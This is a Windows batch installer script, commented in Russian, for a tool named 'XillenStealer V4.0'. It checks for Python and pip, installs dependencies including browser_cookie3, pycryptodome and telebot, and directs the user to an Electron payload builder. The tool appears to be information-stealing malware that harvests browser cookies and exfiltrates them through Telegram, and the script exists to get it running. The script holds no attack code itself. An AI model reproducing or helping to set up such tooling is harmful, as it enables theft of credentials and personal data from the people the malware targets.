@echo off
echo 🚀 XillenStealer V4.0 - Windows Installation Script
echo ==================================================
echo.

REM Проверяем наличие Python
python --version >nul 2>&1
if %errorLevel% neq 0 (
    echo ❌ Python не найден! Установите Python 3.11+ с https://python.org
    echo.
    pause
    exit /b 1
)

echo ✅ Python найден
echo.

REM Проверяем наличие pip
pip --version >nul 2>&1
if %errorLevel% neq 0 (
    echo ❌ pip не найден! Переустановите Python с включенным pip
    echo.
    pause
    exit /b 1
)

echo ✅ pip найден
echo.

echo 📦 Установка Python зависимостей...
echo.

REM Обновляем pip
python -m pip install --upgrade pip

REM Устанавливаем зависимости из requirements.txt
pip install -r requirements.txt

REM Устанавливаем дополнительные Windows зависимости
pip install pywin32 pypiwin32

echo.
echo ✅ Все зависимости установлены!
echo.

echo 🔧 Проверка установки...
python -c "import requests, psutil, PIL, pycryptodome, browser_cookie3, telebot; print('✅ Все модули импортированы успешно')"

if %errorLevel% neq 0 (
    echo ❌ Ошибка при проверке модулей
    echo.
    pause
    exit /b 1
)

echo.
echo 🎉 Установка завершена успешно!
echo.
echo 📋 Что установлено:
echo   ✅ Python зависимости из requirements.txt
echo   ✅ Windows-специфичные модули
echo   ✅ Обновлен pip до последней версии
echo.
echo 🚀 Теперь можно запускать XillenStealer V4.0!
echo.
echo 💡 Для запуска Electron билдера:
echo    cd electron_builder
echo    npm install
echo    npm start
echo.
pause